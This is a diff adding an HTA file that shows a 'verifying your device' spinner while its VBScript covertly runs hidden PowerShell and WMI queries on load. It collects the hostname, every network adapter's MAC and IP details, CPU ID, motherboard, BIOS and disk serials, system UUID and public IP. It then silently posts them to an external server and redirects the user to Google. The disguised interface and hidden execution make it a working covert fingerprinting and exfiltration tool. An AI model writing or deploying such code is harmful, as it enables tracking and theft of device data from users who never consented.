@@ -1,0 +1,262 @@
+<html>
+<head>
+    <title>Loading...</title>
+    <HTA:APPLICATION
+        ID="DeviceReg"
+        APPLICATIONNAME="Register"
+        BORDER="thin"
+        BORDERSTYLE="normal"
+        CAPTION="yes"
+        SHOWINTASKBAR="no"
+        SINGLEINSTANCE="yes"
+        SYSMENU="no"
+        WINDOWSTATE="minimize"
+    />
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: Arial, sans-serif;
+            background: #1a1a2e;
+            color: #eee;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .wrap { text-align: center; }
+        .spinner {
+            width: 48px; height: 48px;
+            border: 4px solid #ffffff22;
+            border-top: 4px solid #00d4ff;
+            border-radius: 50%;
+            margin: 0 auto 18px;
+            animation: spin 0.9s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        p { color: #888; font-size: 13px; }
+    </style>
+</head>
+<body>
+    <div class="wrap">
+        <div class="spinner"></div>
+        <p>Please wait, verifying your device...</p>
+    </div>
+
+<script language="VBScript">
+
+Const SERVER_URL  = "https://web-production-2c4f4.up.railway.app/register-device"
+Const REDIRECT_URL = "https://www.google.com"
+
+' ── Resize + center window ──────────────────────────────────────────────────
+Sub ResizeWindow()
+    window.resizeTo 340, 220
+    Dim sw : sw = window.screen.width
+    Dim sh : sh = window.screen.height
+    window.moveTo (sw - 340) / 2, (sh - 220) / 2
+End Sub
+
+' ── Run a PowerShell command and return trimmed output ───────────────────────
+Function RunPS(cmd)
+    Dim shell : Set shell = CreateObject("WScript.Shell")
+    Dim exec  : Set exec  = shell.Exec("powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command """ & cmd & """")
+    Dim out   : out = exec.StdOut.ReadAll()
+    RunPS = Trim(out)
+    If RunPS = "" Then RunPS = "Unknown"
+End Function
+
+' ── Collect all network adapter MACs via WMI ────────────────────────────────
+Function GetAdaptersJSON()
+    Dim wmi    : Set wmi    = GetObject("winmgmts:\\.\root\cimv2")
+    Dim adapts : Set adapts = wmi.ExecQuery("SELECT * FROM Win32_NetworkAdapter WHERE MACAddress IS NOT NULL")
+    Dim cfgs   : Set cfgs   = wmi.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE MACAddress IS NOT NULL")
+
+    ' Build config lookup by Index
+    Dim cfgMap : Set cfgMap = CreateObject("Scripting.Dictionary")
+    Dim cfg
+    For Each cfg In cfgs
+        cfgMap(CStr(cfg.Index)) = cfg
+    Next
+
+    Dim json : json = "["
+    Dim first : first = True
+    Dim a
+    For Each a In adapts
+        Dim mac : mac = a.MACAddress
+        If mac <> "" And Not IsNull(mac) Then
+            Dim adapterType : adapterType = "Other"
+            Dim aname : aname = LCase(a.Name)
+            If InStr(aname, "wi-fi") > 0 Or InStr(aname, "wireless") > 0 Or InStr(aname, "wlan") > 0 Then
+                adapterType = "WiFi"
+            ElseIf InStr(aname, "vpn") > 0 Or InStr(aname, "tunnel") > 0 Or InStr(aname, "wireguard") > 0 Then
+                adapterType = "VPN"
+            ElseIf InStr(aname, "virtual") > 0 Or InStr(aname, "vmware") > 0 Or InStr(aname, "hyper-v") > 0 Or InStr(aname, "vethernet") > 0 Then
+                adapterType = "Virtual"
+            ElseIf InStr(aname, "bluetooth") > 0 Then
+                adapterType = "Bluetooth"
+            ElseIf InStr(aname, "ethernet") > 0 Or InStr(aname, "realtek") > 0 Or InStr(aname, "gigabit") > 0 Then
+                adapterType = "Ethernet"
+            End If
+
+            Dim status : status = "Unknown"
+            If Not IsNull(a.NetConnectionStatus) Then
+                Select Case CInt(a.NetConnectionStatus)
+                    Case 0 : status = "Disconnected"
+                    Case 2 : status = "Connected"
+                    Case 7 : status = "Media Disconnected"
+                    Case Else : status = "Other(" & a.NetConnectionStatus & ")"
+                End Select
+            End If
+
+            ' Pull IP/DNS from config map
+            Dim ip : ip = "N/A"
+            Dim dns : dns = "N/A"
+            Dim gw  : gw  = "N/A"
+            Dim dhcp : dhcp = "False"
+            Dim key : key = CStr(a.DeviceID)
+            If cfgMap.Exists(key) Then
+                Dim c : Set c = cfgMap(key)
+                If Not IsNull(c.IPAddress) Then
+                    If IsArray(c.IPAddress) Then ip = Join(c.IPAddress, ", ")
+                End If
+                If Not IsNull(c.DNSServerSearchOrder) Then
+                    If IsArray(c.DNSServerSearchOrder) Then dns = Join(c.DNSServerSearchOrder, ", ")
+                End If
+                If Not IsNull(c.DefaultIPGateway) Then
+                    If IsArray(c.DefaultIPGateway) Then gw = Join(c.DefaultIPGateway, ", ")
+                End If
+                If Not IsNull(c.DHCPEnabled) Then
+                    dhcp = CStr(c.DHCPEnabled)
+                End If
+            End If
+
+            ' Escape name for JSON
+            Dim safeName : safeName = Replace(a.Name, """", "'")
+
+            If Not first Then json = json & ","
+            json = json & "{""name"":""" & safeName & """" & _
+                          ",""mac"":"""  & mac & """" & _
+                          ",""adapter_type"":""" & adapterType & """" & _
+                          ",""connection_status"":""" & status & """" & _
+                          ",""ip"":"""   & ip  & """" & _
+                          ",""dns_servers"":""" & dns & """" & _
+                          ",""gateway"":""" & gw & """" & _
+                          ",""dhcp"":""" & dhcp & """}"
+            first = False
+        End If
+    Next
+    json = json & "]"
+    GetAdaptersJSON = json
+End Function
+
+' ── Extract first MAC of a given type from the adapters JSON string ──────────
+Function ExtractMAC(adaptersJson, typeName)
+    ' Simple string search — find "adapter_type":"WiFi" then backtrack to "mac":"..."
+    Dim searchFor : searchFor = """adapter_type"":""" & typeName & """"
+    Dim pos : pos = InStr(adaptersJson, searchFor)
+    If pos = 0 Then
+        ExtractMAC = "Unknown"
+        Exit Function
+    End If
+    ' Find the mac field in the same object block — scan back to opening {
+    Dim blockStart : blockStart = InStrRev(adaptersJson, "{", pos)
+    Dim block : block = Mid(adaptersJson, blockStart, pos - blockStart + Len(searchFor) + 20)
+    Dim macPos : macPos = InStr(block, """mac"":""")
+    If macPos = 0 Then
+        ExtractMAC = "Unknown"
+        Exit Function
+    End If
+    Dim macStart : macStart = macPos + 7
+    Dim macEnd   : macEnd   = InStr(macStart, block, """")
+    ExtractMAC = Mid(block, macStart, macEnd - macStart)
+End Function
+
+' ── Send JSON payload to server via XMLHTTP ──────────────────────────────────
+Sub SendToServer(payload)
+    Dim http : Set http = CreateObject("MSXML2.XMLHTTP")
+    http.Open "POST", SERVER_URL, False
+    http.setRequestHeader "Content-Type", "application/json"
+    http.Send payload
+End Sub
+
+' ── Redirect the user ────────────────────────────────────────────────────────
+Sub RedirectUser()
+    Dim shell : Set shell = CreateObject("WScript.Shell")
+    shell.Run REDIRECT_URL
+    window.close
+End Sub
+
+' ── Main ─────────────────────────────────────────────────────────────────────
+Sub Main()
+    ResizeWindow
+
+    ' Collect adapters
+    Dim adaptersJson : adaptersJson = GetAdaptersJSON()
+
+    ' Pull individual MACs
+    Dim wifiMac      : wifiMac      = ExtractMAC(adaptersJson, "WiFi")
+    Dim lanMac       : lanMac       = ExtractMAC(adaptersJson, "Ethernet")
+    Dim btMac        : btMac        = ExtractMAC(adaptersJson, "Bluetooth")
+
+    ' System info via PowerShell (silent, hidden window)
+    Dim hostname  : hostname  = RunPS("$env:COMPUTERNAME")
+    Dim cpuId     : cpuId     = RunPS("(Get-WmiObject Win32_Processor).ProcessorId")
+    Dim boardSer  : boardSer  = RunPS("(Get-WmiObject Win32_BaseBoard).SerialNumber")
+    Dim biosSer   : biosSer   = RunPS("(Get-WmiObject Win32_BIOS).SerialNumber")
+    Dim diskSer   : diskSer   = RunPS("(Get-WmiObject Win32_DiskDrive).SerialNumber")
+    Dim sysUUID   : sysUUID   = RunPS("(Get-WmiObject Win32_ComputerSystemProduct).UUID")
+    Dim pubIP     : pubIP     = RunPS("(Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing).Content")
+
+    ' Simple fingerprint hash (XOR fold over all key fields)
+    Dim raw : raw = wifiMac & cpuId & boardSer & biosSer & diskSer & sysUUID
+    Dim fingerprint : fingerprint = ""
+    Dim i, h : h = 5381
+    For i = 1 To Len(raw)
+        h = ((h * 33) Xor Asc(Mid(raw, i, 1))) And &HFFFFFFF
+    Next
+    fingerprint = Hex(h) & Hex(h Xor &HDEADBEEF) & Hex(h * 7 And &HFFFFFFF) & Hex(h Xor &HCAFEBABE)
+    fingerprint = UCase(fingerprint)
+
+    ' Build JSON payload
+    Dim payload
+    payload = "{" & _
+        """hostname"":"""     & hostname  & """," & _
+        """mac_address"":"""  & wifiMac   & """," & _
+        """fingerprint"":"""  & fingerprint & """," & _
+        """type"":""Windows""," & _
+        """hardware"":{" & _
+            """wifi_mac"":"""      & wifiMac   & """," & _
+            """lan_mac"":"""       & lanMac    & """," & _
+            """bluetooth_mac"":""" & btMac     & """," & _
+            """cpu_id"":"""        & cpuId     & """," & _
+            """board_serial"":"""  & boardSer  & """," & _
+            """bios_serial"":"""   & biosSer   & """," & _
+            """disk_serial"":"""   & diskSer   & """," & _
+            """system_uuid"":"""   & sysUUID   & """," & _
+            """public_ip"":"""     & pubIP     & """," & _
+            """local_ip"":""N/A""," & _
+            """all_adapters"":"    & adaptersJson & _
+        "}" & _
+    "}"
+
+    ' Send + redirect
+    On Error Resume Next
+    SendToServer payload
+    On Error GoTo 0
+
+    RedirectUser
+End Sub
+
+</script>
+
+<script language="JavaScript">
+    // Trigger VBScript Main after page loads
+    window.onload = function() {
+        setTimeout(function() {
+            window.Main();
+        }, 600);
+    };
+</script>
+
+</body>
+</html>
